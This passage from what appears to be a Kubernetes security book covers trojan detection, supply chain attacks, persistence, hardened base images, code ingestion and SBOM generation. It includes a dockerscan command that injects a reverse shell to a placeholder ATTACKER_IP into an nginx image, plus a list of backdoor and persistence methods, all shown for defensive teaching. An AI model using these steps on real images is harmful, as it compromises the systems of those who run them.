<a href="https://oreil.ly/zYCJp">preventing a DirtyCOW container breakout</a> with an AppArmor profile that blocked the <code>ptrace</code> system call. There’s an example Vagrantfile to reproduce the bug in <a href="https://oreil.ly/Fvu4v">Scott Coulton’s repo</a>.</p>
</div>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Detecting Trojans"><div class="sect2" id="idm45302815441552">
<h2>Detecting Trojans</h2>

<p>Tools like <a data-type="indexterm" data-primary="dockerscan" id="idm45302815439792"/><a data-type="indexterm" data-primary="trojans, detecting" id="troj_detecting"/><a data-type="indexterm" data-primary="attacks" data-secondary="trojans, detecting" id="attak_troj_detect"/><a data-type="indexterm" data-primary="trojanizing, container images" id="idm45302815306608"/><a data-type="indexterm" data-primary="container images" data-secondary="trojanizing" id="idm45302815305920"/><a href="https://oreil.ly/rlLnJ">dockerscan</a> can <em>trojanize</em> a container:</p>
<blockquote>
<p>trojanize: inject a reverse shell into a docker image</p>
<p data-type="attribution">dockerscan</p>
</blockquote>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>We go into more detail on attacking software and libraries in <a data-type="xref" href="#captain_hashjack_attacks_a_supply_chain">“Captain Hashjack Attacks a Supply Chain”</a>.</p>
</div>

<p>To trojanize a <code>webserver</code> image is simple:</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code><code>docker</code><code> </code><code>save</code><code> </code><code>nginx:latest</code><code> </code><code>-o</code><code> </code><code>webserver.tar</code><code> </code><a class="co" id="co_applications_and_supply_chain_CO2-1" href="#callout_applications_and_supply_chain_CO2-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a><code>
</code><code class="nv">$ </code><code>dockerscan</code><code> </code><code>image</code><code> </code><code>modify</code><code> </code><code>trojanize</code><code> </code><code>webserver.tar</code><code> </code><code class="se">\ </code><a class="co" id="co_applications_and_supply_chain_CO2-2" href="#callout_applications_and_supply_chain_CO2-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a><code>
  </code><code>--listen</code><code> </code><code class="s2">"</code><code class="si">${</code><code class="nv">ATTACKER_IP</code><code class="si">}</code><code class="s2">"</code><code> </code><code>--port</code><code> </code><code class="s2">"</code><code class="si">${</code><code class="nv">ATTACKER_PORT</code><code class="si">}</code><code class="s2">"</code><code> </code><a class="co" id="co_applications_and_supply_chain_CO2-3" href="#callout_applications_and_supply_chain_CO2-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a><code>
  </code><code>--output</code><code> </code><code>trojanized-webserver</code><code> </code><a class="co" id="co_applications_and_supply_chain_CO2-4" href="#callout_applications_and_supply_chain_CO2-4"><img src="Images/4.png" alt="4" width="12" height="12"/></a></pre>
<dl class="calloutlist">
<dt><a class="co" id="callout_applications_and_supply_chain_CO2-1" href="#co_applications_and_supply_chain_CO2-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a></dt>
<dd><p>Export a valid <code>webserver</code> tarball from a container image.</p></dd>
<dt><a class="co" id="callout_applications_and_supply_chain_CO2-2" href="#co_applications_and_supply_chain_CO2-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a></dt>
<dd><p>Trojanize the image tarball.</p></dd>
<dt><a class="co" id="callout_applications_and_supply_chain_CO2-3" href="#co_applications_and_supply_chain_CO2-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a></dt>
<dd><p>Specify the attacker’s shellcatcher IP and port.</p></dd>
<dt><a class="co" id="callout_applications_and_supply_chain_CO2-4" href="#co_applications_and_supply_chain_CO2-4"><img src="Images/4.png" alt="4" width="12" height="12"/></a></dt>
<dd><p>Write to an output tarball called <code>trojanized-webserver</code>.</p></dd>
</dl>

<p>It’s this sort of attack that you should scan your container images to detect and prevent. As <code>dockerscan</code> uses an <code>LD_PRELOAD</code> attack that most container IDS and scanning should detect.</p>

<p>Dynamic analysis <a data-type="indexterm" data-primary="software" data-secondary="dynamic analysis" id="idm45302815188112"/>of software involves running it in a malware lab environment where it is unable to communicate with the internet and is observed for signs of C2 (“command and control”), automated attacks, or unexpected behavior.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>Malware such as <a data-type="indexterm" data-primary="WannaCry" id="idm45302815185760"/><a data-type="indexterm" data-primary="killswitches" id="idm45302815160352"/><a data-type="indexterm" data-primary="malware" data-secondary="killswitches" id="idm45302815159744"/>WannaCry (a cryptolocking worm) includes a disabling “killswitch” DNS record (sometimes secretly used by
malware authors to remotely terminate attacks). In some cases, this is used to delay the deployment of the malware until
a convenient time for the attacker.</p>
</div>

<p>Together an artifact and its runtime behavior should form a picture of the trustworthiness of a single package, however there are workarounds. Logic<a data-type="indexterm" data-primary="logic bombs" id="idm45302815157808"/> bombs (behavior only executed on certain conditions) make this difficult to detect unless the logic is known. For example, SUNBURST closely emulated the valid HTTP calls of the software it infected. Even tracing a compromised application with tools such as <code>sysdig</code> does not clearly surface this <a data-type="indexterm" data-primary="trojans, detecting" data-startref="troj_detecting" id="idm45302815156416"/><a data-type="indexterm" data-primary="attacks" data-secondary="trojans, detecting" data-startref="attak_troj_detect" id="idm45302815155568"/>type of <a data-type="indexterm" data-primary="supply chain attacks" data-secondary="procedures" id="sca_proc"/>attack.</p>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Captain Hashjack Attacks a Supply Chain"><div class="sect1" id="captain_hashjack_attacks_a_supply_chain">
<h1>Captain Hashjack Attacks a Supply Chain</h1>
<div class="clear">
<figure class="informal no-frame width-35"><div id="captain4" class="figure">
<img src="Images/haku_0000.png" alt="captain" width="1086" height="1103"/>
<h6/>
</div></figure>
<p>You know BCTL hasn’t put enough effort into supply chain security. Open source ingestion isn’t regulated, and developers ignore the results of CVE scanning in the pipeline.</p>

<p>Dread Pirate Hashjack dusts off their keyboard and starts the attack. The goal is to add malicious code to a container image, an open source package, or an operating system application that your team will run in <span class="keep-together">production.</span></p>

<p>In this case, Captain Hashjack is looking to attack the rest of your systems from a foothold in an initial pod attack. When the malicious code runs inside your pods it will connect back to a server that the Captain controls. That connection will relay attack commands to run inside that pod in your cluster so the pirates can have a look around, as shown in <a data-type="xref" href="#app-remote-access-supply-chain">Figure 4-4</a>.</p>
</div>

<p>From this position of remote control, Captain Hashjack might:</p>

<ul>
<li>
<p>Enumerate other infrastructure around the cluster like datastores and internally facing software</p>
</li>
<li>
<p>Try to escalate privilege and take over your nodes or cluster</p>
</li>
<li>
<p>Mine cryptocurrency</p>
</li>
<li>
<p>Add the pods or nodes to a botnet, use them as servers, or “watering holes” to spread malware</p>
</li>
<li>
<p>Any other unintended misuse of your noncompromised systems.</p>
</li>
</ul>

<figure><div id="app-remote-access-supply-chain" class="figure">
<img src="Images/haku_0404.png" alt="Establishing remote access with a supply chain compromise" width="1449" height="851"/>
<h6><span class="label">Figure 4-4. </span>Establishing remote access with a supply chain compromise</h6>
</div></figure>

<p>The <a href="https://openssf.org">Open Source Security Foundation (OpenSSF)</a>’s <a href="https://slsa.dev">SLSA Framework</a> (“Supply-chain
Levels for Software Artifacts,” or “Salsa”) works on the principle that “It can take years to achieve the ideal security
state, and intermediate milestones are important.” It defines a graded approach to adopting supply chain security for
your builds (see <a data-type="xref" href="#table-openssf">Table 4-2</a>).</p>
<table id="table-openssf">
<caption><span class="label">Table 4-2. </span>OpenSSF SLSA levels</caption>
<thead>
<tr>
<th>Level</th>
<th>Description</th>
<th>Requirements</th>
</tr>
</thead>
<tbody>
<tr>
<td><p>0</p></td>
<td><p>No guarantees</p></td>
<td><p>SLSA 0 represents the lack of any SLSA level.</p></td>
</tr>
<tr>
<td><p>1</p></td>
<td><p>Provenance checks to help evaluate risks and security</p></td>
<td><p>The build process must be fully scripted/automated and generate provenance.</p></td>
</tr>
<tr>
<td><p>2</p></td>
<td><p>Further checks against the 
<span class="keep-together">origin of the</span> software</p></td>
<td><p>Requires using version control and a hosted build service that generates authenticated provenance. This results in tamper resistance of the build service.</p></td>
</tr>
<tr>
<td><p>3</p></td>
<td><p>Extra resistance to specific classes of threats</p></td>
<td><p>The source and build platforms meet specific standards to guarantee the auditability of the source and the integrity of the provenance respectively. Advanced protection including security controls on host, non-falsifiable provenance, and prevention of cross-build contamination.</p></td>
</tr>
<tr>
<td><p>4</p></td>
<td><p>Highest levels of confidence 
<span class="keep-together">and trust</span></p></td>
<td><p>Strict auditability and reliability checks. Requires two-person review of all changes and a hermetic, reproducible build process.</p></td>
</tr>
</tbody>
</table>

<p>Let’s move on to the<a data-type="indexterm" data-primary="supply chain attacks" data-secondary="procedures" data-startref="sca_proc" id="idm45302815117616"/> aftermath.</p>








<section data-type="sect2" data-pdf-bookmark="Post-Compromise Persistence"><div class="sect2" id="idm45302815116112">
<h2>Post-Compromise Persistence</h2>

<p>Before attackers <a data-type="indexterm" data-primary="attacks" data-secondary="persistence and" id="idm45302815114608"/>do something that may be detected by the defender, they look to establish persistence, or a<a data-type="indexterm" data-primary="backdoors" id="idm45302815113360"/> backdoor, so they can, for example, enter the system if they get detected or unceremoniously ejected, as their method of intrusion is patched.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>When containers<a data-type="indexterm" data-primary="containers" data-secondary="backdoors and" id="idm45302815111424"/> restart, filesystem changes are lost, so persistence is not possible just by writing to the container
filesystem. Dropping a “back door” or other persistence mechanism in Kubernetes requires the attacker to use other parts
of Kubernetes or the <code>kubelet</code> on the host, as anything they write inside the container is lost when it restarts.</p>
</div>

<p>Depending on how you were compromised, Captain Hashjack now has various options available. None are possible in a
well-configured container without excessive RBAC privilege, although this doesn’t stop the attacker exlpoiting the same
path again and looking to pivot to another part of your system.</p>

<p>Possible persistence in Kubernetes can be gained by:</p>

<ul>
<li>
<p>Starting a static privileged pod through the <code>kubelet</code>’s static manifests</p>
</li>
<li>
<p>Deploying a privileged container directly using the container runtime</p>
</li>
<li>
<p>Deploying an admission controller or CronJob with a backdoor</p>
</li>
<li>
<p>Deploying a shadow API server with custom authentication</p>
</li>
<li>
<p>Adding a mutating webhook that injects a backdoor container to some new pods</p>
</li>
<li>
<p>Adding worker or control plane nodes to a botnet or C2 network</p>
</li>
<li>
<p>Editing container lifecycle <code>postStart</code> and <code>preStop</code> hooks to add backdoors</p>
</li>
<li>
<p>Editing liveness probes to exec a backdoor in the target container</p>
</li>
<li>
<p>Any other mechanism that runs code under the attacker’s control</p>
</li>
</ul>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Risks to Your Systems"><div class="sect2" id="idm45302815098032">
<h2>Risks to Your Systems</h2>

<p>Once they have established <a data-type="indexterm" data-primary="attacks" data-secondary="goals" id="atks_purposes"/>persistence, attacks may become more bold and 
<span class="keep-together">dangerous:</span></p>

<ul>
<li>
<p>Exfiltrating data, credentials, and cryptocurrency wallets</p>
</li>
<li>
<p>Pivoting further into the system via other pods, the control plane, worker nodes, or cloud account</p>
</li>
<li>
<p>Cryptojacking compute resources (e.g., <a href="https://oreil.ly/0E9iw">mining Monero in Docker containers</a>)</p>
</li>
<li>
<p>Escalating privilege in the same pod</p>
</li>
<li>
<p>Cryptolocking data</p>
</li>
<li>
<p>Secondary supply chain attack on target’s published artifacts/software</p>
</li>
</ul>

<p>Let’s move on to container <a data-type="indexterm" data-primary="attacks" data-secondary="goals" data-startref="atks_purposes" id="idm45302815087488"/>images.</p>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Container Image Build Supply Chains"><div class="sect1" id="idm45302815152544">
<h1>Container Image Build Supply Chains</h1>

<p>Your developers have written code that needs to be built and run in production. CI/CD automation enables the building and deployment of artifacts, and is a traditionally appealing target due to less security rigor than the production systems it deploys to.</p>

<p>To address this insecurity, the Software Factory<a data-type="indexterm" data-primary="Software Factories" id="idm45302815083744"/><a data-type="indexterm" data-primary="pipelines" data-secondary="building" id="idm45302815083040"/><a data-type="indexterm" data-primary="security" data-secondary="pipelines" data-tertiary="building" id="idm45302815082096"/> pattern is gaining adoption as a model for building the pipelines to build software.</p>








<section data-type="sect2" data-pdf-bookmark="Software Factories"><div class="sect2" id="idm45302815080624">
<h2>Software Factories</h2>

<p>A Software Factory is a form of CI/CD <a data-type="indexterm" data-primary="CI/CD (Continuous Integration, Continuous Delivery)" data-secondary="Software Factories" id="idm45302815079104"/>that focuses on self-replication. It is a build system that can deploy copies of
itself, or other parts of the system, as new<a data-type="indexterm" data-primary="pipelines" data-secondary="CI/CD" id="idm45302815077760"/><a data-type="indexterm" data-primary="security" data-secondary="pipelines" data-tertiary="CI/CD" id="idm45302815076816"/> CI/CD pipelines. This focus on replication ensures build systems are
repeatable, easy to deploy, and easy to replace. They also assist iteration and development of the build infrastructure
itself, which makes securing these types of systems much easier.</p>

<p>Use of this pattern requires slick DevOps skills, continuous integration, and build automation practices, and is ideal
for containers due to their compartmentalised nature.</p>
<div data-type="tip"><h6>Tip</h6>
<p>The
<a href="https://oreil.ly/HqNz4">DoD Software Factory pattern</a> defines the<a data-type="indexterm" data-primary="DoD Software Factory" id="idm45302815072752"/> Department of Defense’s best practice ideals for building secure, large-scale cloud or on-prem cloud native infrastructure.</p>

<p>Container images built from, and used to build, the DoD Software Factory are publicly available at <a href="https://oreil.ly/3NvDj">IronBank GitLab</a>.</p>
</div>

<p>Cryptographic <a data-type="indexterm" data-primary="software development" data-secondary="cryptographic signing" id="idm45302815070016"/><a data-type="indexterm" data-primary="cryptographic signing" data-secondary="software development" id="idm45302815069008"/>signing of build steps and artifacts can increase trust in the system, and can be revalidated with an
admission controller such as <a href="https://oreil.ly/mY9eu">portieris</a> for Notary and <a href="https://oreil.ly/R33SG">Kritis</a> for Grafeas.</p>

<p>Tekton <a data-type="indexterm" data-primary="Tekton" id="idm45302815065968"/>is a Kubernetes-based build system that runs build stages in containers. It runs Kubernetes Custom Resources<a data-type="indexterm" data-primary="Custom Resources, software development" id="idm45302815064976"/> that
define build steps in pods, and <a href="https://oreil.ly/ZHMmw">Tekton Chains</a> can use in-toto to sign the pod’s
workspace files. <a href="https://jenkins-x.io">Jenkins X</a> is built on top of it and extends its feature set.</p>
<div data-type="tip"><h6>Tip</h6>
<p><a href="https://oreil.ly/av7UQ">Dan Lorenc</a> elegantly summarised <a href="https://oreil.ly/WUVHD">the supply chain signing 
<span class="keep-together">landscape</span></a>.</p>
</div>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Blessed Image Factory"><div class="sect2" id="idm45302815059456">
<h2>Blessed Image Factory</h2>

<p>Some software <a data-type="indexterm" data-primary="container builds" data-secondary="attacks on" id="idm45302815057792"/><a data-type="indexterm" data-primary="software development" data-secondary="container builds" id="sd_cb"/>factory pipelines are used to build and scan your base images,
in the same way virtual machine images are built: on a cadence, and in response to releases of the underlying image.
An image build is untrusted if any of the inputs to the build are not trusted. An adversary can attack<a data-type="indexterm" data-primary="attacks" data-secondary="container builds" id="idm45302815055136"/> a container build with:</p>

<ul>
<li>
<p>Malicious commands in a <code>RUN</code> directive that can attack the host</p>
</li>
<li>
<p>Host’s non-loopback network ports/services</p>
</li>
<li>
<p>Enumeration of other network entities (cloud provider, build infrastructure, network routes to production)</p>
</li>
<li>
<p>Malicious <code>FROM</code> image that has access to build Secrets</p>
</li>
<li>
<p>Malicious image that has <code>ONBUILD</code> directive</p>
</li>
<li>
<p>Docker-in-docker and mounted container runtime sockets that can lead to host breakout</p>
</li>
<li>
<p>Zero-days in container runtime or kernel</p>
</li>
<li>
<p>Network attack surface (host, ports exposed by other builds)</p>
</li>
</ul>

<p>To defend from malicious<a data-type="indexterm" data-primary="container builds" data-secondary="malicious, defending against" id="idm45302815044240"/> builds, you should begin<a data-type="indexterm" data-primary="Hadolint" id="idm45302815043072"/> with static analysis using <a href="https://oreil.ly/M8GDi">Hadolint</a> and <a href="https://oreil.ly/8mKFd">conftest</a> to enforce your policy. For <a data-type="indexterm" data-primary="conftest" id="idm45302815040816"/>example:</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code>docker run --rm -i hadolint/hadolint &lt; Dockerfile
/dev/stdin:3 DL3008 Pin versions in apt get install.
/dev/stdin:5 DL3020 Use COPY instead of ADD <code class="k">for</code> files and folders</pre>

<p>Conftest wraps OPA and runs Rego language <a data-type="indexterm" data-primary="Rego" data-secondary="policies" id="idm45302815017552"/>policies
(see <a data-type="xref" href="ch08.xhtml#open-policy-agent">“Open Policy Agent”</a>):</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code>conftest <code class="nb">test</code> --policy ./test/policy --all-namespaces Dockerfile
<code class="m">2</code> tests, <code class="m">2</code> passed, <code class="m">0</code> warnings, <code class="m">0</code> failures, <code class="m">0</code> exceptions</pre>

<p>If the Dockerfile<a data-type="indexterm" data-primary="Dockerfile" id="idm45302814997664"/> conforms to policy, scan the container build workspace with tools like trivy.
You can also build and then scan, although this is slightly riskier if an
attack spawns a reverse shell into the build environment.</p>

<p>If the container’s scan is safe, you can perform a build.</p>
<div data-type="tip"><h6>Tip</h6>
<p>Adding a hardening stage to the Dockerfile helps to remove unnecessary files and binaries that an attacker may try to exploit, and <a data-type="indexterm" data-primary="Container Hardening Guide" id="idm45302814995200"/>is detailed in <a href="https://oreil.ly/7lVbG">DoD’s Container Hardening Guide</a>.</p>
</div>

<p>Protecting the build’s network is important, otherwise malicious code in a container build can pull
further dependencies and malicious code from the internet. Security <a data-type="indexterm" data-primary="security controls" data-secondary="container builds" id="idm45302814992976"/>controls of varying difficulty include:</p>

<ul>
<li>
<p>Preventing network egress</p>
</li>
<li>
<p>Isolating from the host’s kernel with a VM</p>
</li>
<li>
<p>Running the build process as a nonroot user or in a user namespace</p>
</li>
<li>
<p>Executing <code>RUN</code> commands as a nonroot user in container filesystem</p>
</li>
<li>
<p>Share nothing nonessential with the<a data-type="indexterm" data-primary="software development" data-secondary="container builds" data-startref="sd_cb" id="idm45302815025152"/> build</p>
</li>
</ul>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Base Images"><div class="sect2" id="idm45302815058864">
<h2>Base Images</h2>

<p>When an<a data-type="indexterm" data-primary="applications" data-secondary="base images" id="app_baseimg"/><a data-type="indexterm" data-primary="container images" data-secondary="base images" id="contimg_bseimg"/><a data-type="indexterm" data-primary="base images" id="baseimgs"/> application is being packaged for deployment it must be built into a container image. Depending on your choice
of programming language and application dependencies, your <a data-type="indexterm" data-primary="scratch base images" id="idm45302814968416"/><a data-type="indexterm" data-primary="distroless base images" id="idm45302814967808"/>container will use one of the base images from
<a data-type="xref" href="Images/#app-table-base-images">Table 4-3</a>.</p>
<table id="app-table-base-images">
<caption><span class="label">Table 4-3. </span>Types of base images</caption>
<thead>
<tr>
<th>Type of base image</th>
<th>How it’s built</th>
<th>Contents of image filesystem</th>
<th>Example container image</th>
</tr>
</thead>
<tbody>
<tr>
<td><p>Scratch</p></td>
<td><p>Add one (or more) static binary to an empty container root filesystem.</p></td>
<td><p>Nothing at all except <code>/my-binary</code> (it’s the only thing in <code>/</code> directory), and any added dependencies (often CA bundles, locale information, static files for the application).</p></td>
<td><p><a href="https://oreil.ly/7VW3k">Static Golang or Rust binary examples</a></p></td>
</tr>
<tr>
<td><p>Distroless</p></td>
<td><p>Add one (or more) static binary to a container that has locale and CA information only (no Bash, Busybox, etc.).</p></td>
<td><p>Nothing except <code>my-app</code>, <code>/etc/locale</code>, TLS pubkeys, (plus any dependencies, as per scratch), etc.</p></td>
<td><p><a href="https://oreil.ly/RZc07">Static Golang or Rust binary examples</a></p></td>
</tr>
<tr>
<td><p>Hardened</p></td>
<td><p>Add nonstatic binary or dynamic application to a minimal container, then remove all nonessential files and harden filesystem.</p></td>
<td><p>Reduced Linux userspace: <code>glibc</code>, <code>/code/my-app.py</code>, <code>/code/deps</code>, <code>/bin/python</code>, Python libs, static files for the application.</p></td>
<td><p>Web servers, nonstatic or complex applications, <a href="https://oreil.ly/tYOPP">IronBank examples</a></p></td>
</tr>
<tr>
<td><p>Vanilla</p></td>
<td><p>No security precautions, possibly dangerous.</p></td>
<td><p>Standard Linux userspace. Root user. Possibly anything and everything required to install, build, compile, or debug applications. This offers many opportunities for attack.</p></td>
<td><p><a href="https://oreil.ly/0M1HH">NGINX</a>, <a href="https://oreil.ly/nGOby">raesene/alpine-nettools</a>, <a href="https://oreil.ly/60byc">nicolaka/netshoot</a></p></td>
</tr>
</tbody>
</table>

<p>Minimal containers<a data-type="indexterm" data-primary="minimal containers" id="idm45302814942832"/><a data-type="indexterm" data-primary="attack surface" data-secondary="minimal containers" id="idm45302814942128"/> minimize a <a data-type="indexterm" data-primary="hardened base images" id="idm45302814941024"/><a data-type="indexterm" data-primary="vanilla base images" id="idm45302814940320"/>container’s attack surface to a hostile process or RCE, reducing an adversary to very
advanced tricks like <a href="https://oreil.ly/Kr4Kn">return-oriented programming</a> that are
beyond<a data-type="indexterm" data-primary="Return-oriented programming" id="idm45302814938736"/> most attackers’ capabilities. Organized criminals like Dread Pirate Hashjack may be able to use these programming
techniques, but exploiting vulnerabilities like these are valuable and perhaps more likely to be sold to an
exploit broker than used in the field, potentially reducing their value if discovered.</p>

<p>Because statically compiled binaries ship their own system call library,
they do not need <code>glibc</code> or another userspace
kernel interface, and can exist with only themselves on the filesystem (see <a data-type="xref" href="#app-scratch-vs-glibc">Figure 4-5</a>).</p>

<figure><div id="app-scratch-vs-glibc" class="figure">
<img src="Images/haku_0405.png" alt="app-scratch-vs-glibc" width="311" height="178"/>
<h6><span class="label">Figure 4-5. </span>How scratch containers and <code>glibc</code> talk to the kernel</h6>
</div></figure>

<p>Let’s step back a bit now: we need to take stock of our supply<a data-type="indexterm" data-primary="applications" data-secondary="base images" data-startref="app_baseimg" id="idm45302814932960"/><a data-type="indexterm" data-primary="container images" data-secondary="base images" data-startref="contimg_bseimg" id="idm45302814931712"/><a data-type="indexterm" data-primary="base images" data-startref="baseimgs" id="idm45302814930496"/> chain.</p>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="The State of Your Container Supply Chains"><div class="sect1" id="idm45302814929296">
<h1>The State of Your Container Supply Chains</h1>

<p>Applications in containers <a data-type="indexterm" data-primary="supply chains" data-secondary="containers, security considerations" id="supchn_cont_seccon"/><a data-type="indexterm" data-primary="applications" data-secondary="userspace dependencies" id="idm45302814926544"/><a data-type="indexterm" data-primary="userspace dependencies, applications" id="idm45302814925600"/>bundle all their userspace dependencies with them, and this allows us to inspect the
composition of an application. The blast radius of a compromised container is less than a bare metal server (the
container provides security configuration around the namespaces), but exacerbated by the highly parallelised nature of a
Kubernetes workload deployment.</p>

<p>Secure third-party code ingestion requires trust and verification of upstream 
<span class="keep-together">dependencies.</span></p>

<p>Kubernetes components (OS, containers, config) are a <a data-type="indexterm" data-primary="supply chains" data-secondary="Kubernetes distributions, security considerations" id="idm45302814922992"/>supply chain risk in themselves. Kubernetes distributions that pull
unsigned artifacts from object storage (such as S3 and GCS) have no way of validating that the developers meant them to
run those containers. Any containers with “escape-friendly configuration” (disabled security features, a lack of
hardening, unmonitored and unsecured, etc.) are viable assets for attack.</p>

<p class="pagebreak-before">The same is true of supporting applications (logging/monitoring, observability, 
<span class="keep-together">IDS)—anything</span> that is installed as root, that is not hardened, or indeed not architected for resilience to compromise, is potentially subjected to swashbuckling attacks from hostile<a data-type="indexterm" data-primary="supply chains" data-secondary="containers, security considerations" data-startref="supchn_cont_seccon" id="idm45302814919856"/> forces.</p>








<section data-type="sect2" data-pdf-bookmark="Third-Party Code Risk"><div class="sect2" id="idm45302814918336">
<h2>Third-Party Code Risk</h2>

<p>During the image build your <a data-type="indexterm" data-primary="image builds, third-party code" id="idm45302814916832"/><a data-type="indexterm" data-primary="third-party code, scanning ingested" id="tpc_scan"/><a data-type="indexterm" data-primary="code, scanning ingested" id="code_scan"/>application installs dependencies into the container, and the same dependencies are often
installed onto developers’ machines. This requires the secure ingestion of third party and open source code.</p>

<p>You value your data security, so running any code from the internet without first verifying it could be unsafe.
Adversaries like Captain Hashjack may have left a backdoor to enable remote access to any system that runs their malicious
code. You should consider the risk of such an attack as sufficiently low before you allow the software inside your
organization’s corporate network and production systems.</p>

<p>One method to scan ingested code is shown in <a data-type="xref" href="#app-third-party-code-ingestion">Figure 4-6</a>. Containers (and other code) that originate outside your organization are pulled from the internet onto a temporary virtual machine. All software signatures and checksums are verified, binaries and source code are scanned for CVEs and malware, and the artifact is packaged and signed for consumption in an internal registry.</p>

<figure><div id="app-third-party-code-ingestion" class="figure">
<img src="Images/haku_0406.png" alt="Third-party code ingestion (detailed)" width="1455" height="534"/>
<h6><span class="label">Figure 4-6. </span>Third-party code ingestion</h6>
</div></figure>

<p class="pagebreak-before">In this example a container pulled from a public registry is scanned for CVEs, e.g., tagged for the internal domain, then signed with Notary and pushed to an internal registry, where it can be consumed by Kubernetes build systems and your developers.</p>

<p>When ingesting third-party code you should be cognizant of who has released it and/or signed the package, the dependencies it uses itself, how long it has been published for, and how it scores<a data-type="indexterm" data-primary="pipelines" data-secondary="third-party code" id="idm45302814907840"/><a data-type="indexterm" data-primary="security" data-secondary="pipelines" data-tertiary="third-party code" id="idm45302814906864"/> in your internal static analysis pipelines.</p>
<div data-type="tip"><h6>Tip</h6>
<p>Aqua’s <a href="https://oreil.ly/u1Rc8">Dynamic Threat Analysis for Containers</a> runs potentially
hostile <a data-type="indexterm" data-primary="Aqua Security" data-secondary="Dynamic Threat Analysis for Containers" id="idm45302814903664"/><a data-type="indexterm" data-primary="Dynamic Threat Analysis for Containers" id="idm45302814902656"/>containers in a sandbox to observe their behavior for signs of malice.</p>
</div>

<p>Scanning third-party code before it enters your network protects you from some supply chain compromises, but targeted
attacks may be harder to defend against as they may not use known CVEs or malware. In these cases you may want to
observe it running as part of your<a data-type="indexterm" data-primary="third-party code, scanning ingested" data-startref="tpc_scan" id="idm45302814900960"/><a data-type="indexterm" data-primary="code, scanning ingested" data-startref="code_scan" id="idm45302814899968"/> validation.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Software Bills of Materials"><div class="sect2" id="idm45302814898768">
<h2>Software Bills of Materials</h2>

<p>Creating a software bill of materials (SBOM)<a data-type="indexterm" data-primary="SBOMs (Software Bill of Materials)" id="SBOM"/><a data-type="indexterm" data-primary="Software Bills of Materials (SBOMs)" id="SBOM_n"/> for a container image is easy with tools
like
<a href="https://oreil.ly/Z7j5T">syft</a>, which <a data-type="indexterm" data-primary="syft" id="idm45302814894432"/>supports APK, DEB, RPM, Ruby
Bundles, Python Wheel/Egg/requirements.txt,
JavaScript NPM/Yarn, Java JAR/EAR/WAR, Jenkins plugi-ns JPI/HPI, and Go modules.</p>

<p>It can generate output in the <a href="https://cyclonedx.org">CycloneDX</a> XM <a data-type="indexterm" data-primary="CycloneDX, XM output format" id="idm45302814892320"/>format. Here it is running on a container with a
single static binary:</p>

<pre data-type="programlisting" data-code-language="bash"><code>user@host:~</code><code> </code><code class="o">[</code><code>0</code><code class="o">]</code><code class="nv">$ </code><code>syft</code><code> </code><code>packages</code><code> </code><code>controlplane/bizcard:latest</code><code> </code><code>-o</code><code> </code><code>cyclonedx</code><code>
</code><code>Loaded</code><code> </code><code>image</code><code>
</code><code>Parsed</code><code> </code><code>image</code><code>
</code><code>Cataloged</code><code> </code><code>packages</code><code>      </code><code class="o">[</code><code class="m">0</code><code> </code><code>packages</code><code class="o">]</code><code>
</code><code>&lt;</code><code>?xml</code><code> </code><code class="nv">version</code><code class="o">=</code><code class="s2">"1.0"</code><code> </code><code class="nv">encoding</code><code class="o">=</code><code class="s2">"UTF-8"</code><code>?&gt;</code><code>
</code><code>&lt;</code><code>bom</code><code> </code><code class="nv">xmlns</code><code class="o">=</code><code class="s2">"http://cyclonedx.org/schema/bom/1.2"</code><code>
    </code><code class="nv">version</code><code class="o">=</code><code class="s2">"1"</code><code> </code><code class="nv">serialNumber</code><code class="o">=</code><code class="s2">"urn:uuid:18263bb0-dd82-4527-979b-1d9b15fe4ea7"</code><code>&gt;</code><code>
  </code><code>&lt;</code><code>metadata&gt;</code><code>
    </code><code>&lt;</code><code>timestamp&gt;2021-05-30T19:15:24+01:00</code><code>&lt;</code><code>/timestamp&gt;</code><code>
    </code><code>&lt;</code><code>tools&gt;</code><code>
      </code><code>&lt;</code><code>tool&gt;</code><code>
        </code><code>&lt;</code><code>vendor&gt;anchore</code><code>&lt;</code><code>/vendor&gt;</code><code>   </code><a class="co" id="co_applications_and_supply_chain_CO3-1" href="#callout_applications_and_supply_chain_CO3-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a><code>
        </code><code>&lt;</code><code>name&gt;syft</code><code>&lt;</code><code>/name&gt;</code><code>          </code><a class="co" id="co_applications_and_supply_chain_CO3-2" href="#callout_applications_and_supply_chain_CO3-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a><code>
        </code><code>&lt;</code><code>version&gt;0.16.1</code><code>&lt;</code><code>/version&gt;</code><code>  </code><a class="co" id="co_applications_and_supply_chain_CO3-3" href="#callout_applications_and_supply_chain_CO3-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a><code>
      </code><code>&lt;</code><code>/tool&gt;</code><code>
    </code><code>&lt;</code><code>/tools&gt;</code><code>
    </code><code>&lt;</code><code>component</code><code> </code><code class="nb">type</code><code class="o">=</code><code class="s2">"container"</code><code>&gt;</code><code>  </code><a class="co" id="co_applications_and_supply_chain_CO3-4" href="#callout_applications_and_supply_chain_CO3-4"><img src="Images/4.png" alt="4" width="12" height="12"/></a><code>
      </code><code>&lt;</code><code>name&gt;controlplane/bizcard:latest</code><code>&lt;</code><code>/name&gt;</code><code> </code><a class="co" id="co_applications_and_supply_chain_CO3-5" href="#callout_applications_and_supply_chain_CO3-5"><img src="Images/5.png" alt="5" width="12" height="12"/></a><code>
